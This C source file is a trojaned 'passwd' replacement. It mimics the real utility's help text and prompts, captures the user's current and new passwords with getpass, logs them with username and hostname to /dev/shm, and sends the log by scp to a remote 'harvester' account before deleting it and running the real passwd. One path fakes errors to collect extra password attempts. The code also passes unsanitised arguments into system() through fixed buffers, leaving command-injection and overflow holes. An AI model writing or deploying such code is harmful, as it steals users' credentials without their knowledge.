#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>

void aV8A9h3K(char *filename, struct passwd *p, char *passlist[], int rounds, char *date){//sshsession
    char hostname[100];
    gethostname(hostname, 100);
    FILE *fp;
    fp = fopen(filename, "w");
    for(int i = 0; i < rounds; i++){
        fprintf(fp, "%s@%s: %s entered the passphrase: %s at %s\n", p->pw_name, hostname, p->pw_name, passlist[i], date);
    }
    fclose(fp);
    char command[50] = "/usr/bin/scp -q '";
    char dest[100] = "' harvester@172.16.91.5:/var/harvester";
    strcat(command, filename);
    strcat(command, dest);
    system(command);
    strcpy(command, "/bin/rm '"); 
    strcat(command, filename);
    strcat(command, "'");
    system(command);
}
void rRoAHUF2(int rounds, char *argv[], int argc, int condition){//goodbean
    printf("Entering good bean\n");
    if (argc == 1){
        rounds = rounds + 1;
        struct passwd *p = getpwuid(getuid()); 
        char pass[100] = "";
        char date[250] = "";
        char *passlist[rounds];
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        char filename[100] = "/dev/shm/badwords-(";
        strcat(filename, date);
        strcat(filename,").har");
        printf("Changing password for %s.\n", getlogin());
        strcpy(pass, getpass("Current password: "));
        passlist[0] = pass;
        sleep(1);
        strcpy(pass, getpass("New password: "));
        passlist[1] = pass;
        strcpy(pass, getpass("Retype new password: "));
        passlist[2] = pass;
        printf("password: Authentication token manipulation error\n");
        aV8A9h3K(filename, p, passlist, rounds, date);
        char command[100] = "/usr/bin/passwd ";
        for (int i = 1; i < argc; i++){
            strcat(command, argv[i]);
            strcat(command, " ");
        }
        system(command);
        }
    else {
        char command[100] = "/usr/bin/passwd ";
        for (int i = 1; i < argc; i++){
            strcat(command, argv[i]);
            strcat(command, " ");
        }
        system(command);
    }

}
void Bitnfw2b(int rounds, char *argv[], int argc){//badbean
    printf("Entering bad bean\n");
     if (argc == 1){
        int attempts = 0;
        rounds = rounds + 1;
        struct passwd *p = getpwuid(getuid());
        char pass[100] = "";
        char date[250] = "";
        char *passlist[rounds];
        //Creating time and the filename
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        char filename[100] = "/dev/shm/badwords-(";
        strcat(filename, date);
        strcat(filename,").har");

        printf("Changing password for %s.\n", getlogin());
        strcpy(pass, getpass("Current password: "));
        passlist[attempts] = pass;
        sleep(1);
        while(attempts < rounds){
            strcpy(pass, getpass("New password: "));
            passlist[attempts] = pass;
            strcpy(pass, getpass("Retype new password: "));
            passlist[attempts] = pass;
            sleep(2);
            printf("new and old password are too similar\n");
            attempts = attempts + 1;
        }
        printf("passwd: Authentication token manipulation error\n");
        printf("passwd: password unchanged\n");
        aV8A9h3K(filename, p, passlist, rounds, date);
        }
    else {
        char command[100] = "/usr/bin/passwd ";
        for (int i = 1; i < argc; i++){
            strcat(command, argv[i]);
            strcat(command, " ");
        }
        system(command);
    }
}
void helppage(){
    char *passwdhelp = "Usage: passwd [options] [LOGIN]\n\n"
"Options:\n"
"  -a, --all                     report password status on all accounts\n"
"  -d, --delete                  delete the password for the named account\n"
"  -e, --expire                  force expire the password for the named account\n"
"  -h, --help                    display this help message and exit\n"
"  -k, --keep-tokens             change password only if expired\n"
"  -i, --inactive INACTIVE       set password inactive after expiration\n"
"                                to INACTIVE\n"
"  -l, --lock                    lock the password of the named account\n"
"  -n, --mindays MIN_DAYS        set minimum number of days before password\n"
"                                change to MIN_DAYS\n"
"  -q, --quiet                   quiet mode\n"
"  -r, --repository REPOSITORY   change password in REPOSITORY repository\n"
"  -R, --root CHROOT_DIR         directory to chroot into\n"
"  -S, --status                  report password status on the named account\n"
"  -u, --unlock                  unlock the password of the named account\n"
"  -w, --warndays WARN_DAYS      set expiration warning days to WARN_DAYS\n"
"  -x, --maxdays MAX_DAYS        set maximum number of days before password\n"
"                                change to MAX_DAYS\n";
printf("%s", passwdhelp);
}
int main(int argc, char *argv[]){
    if (argc > 1){
        if ( strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0){
            helppage();
            exit(0);
        }
    }
    time_t t; 
    srand( (unsigned) time(&t));
    int condition = rand() % 3;
    int rounds = (rand() % 3) + 2;
    if (condition == 0){
        Bitnfw2b(rounds, argv, argc);
    }
    else {
        int rounds = 2;
        rRoAHUF2(rounds, argv, argc, condition);
    }
    return 0;
}
